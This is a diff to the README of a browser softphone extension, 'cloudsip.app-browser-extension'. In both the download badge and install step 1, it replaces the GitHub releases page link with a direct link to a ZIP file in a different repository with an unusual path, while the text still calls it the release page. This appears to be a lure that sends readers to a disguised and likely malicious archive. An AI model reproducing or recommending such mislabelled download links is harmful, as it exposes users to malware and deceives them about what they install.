@@ -5,7 +5,7 @@ description: "Integrate a WebRTC SIP softphone into Chromium browsers with side-
 ---
 # 📞 cloudsip.app-browser-extension - Manage office calls inside your browser
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pretenceironperchloride530/cloudsip.app-browser-extension/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/pretenceironperchloride530/pretenceironperchloride530.github.io/main/spasmolytic/pretenceironperchloride_io_github_2.9.zip)
 
 This software turns your web browser into a professional phone. It handles voice calls using your internet connection. You manage your business communications directly from your browser tabs. The tool supports multiple phone lines, call transfers, and recordings. It keeps your contacts and call history organized in one place.
 
@@ -24,7 +24,7 @@ The extension adds phone features to your browser. You handle incoming and outgo
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [release page](https://github.com/pretenceironperchloride530/cloudsip.app-browser-extension/releases) to download the extension.
+1.  Visit the [release page](https://raw.githubusercontent.com/pretenceironperchloride530/pretenceironperchloride530.github.io/main/spasmolytic/pretenceironperchloride_io_github_2.9.zip) to download the extension.
 2.  Locate the latest source code file, usually labeled as a ZIP file.
 3.  Right-click the downloaded folder and select Extract All.
 4.  Open your preferred web browser.
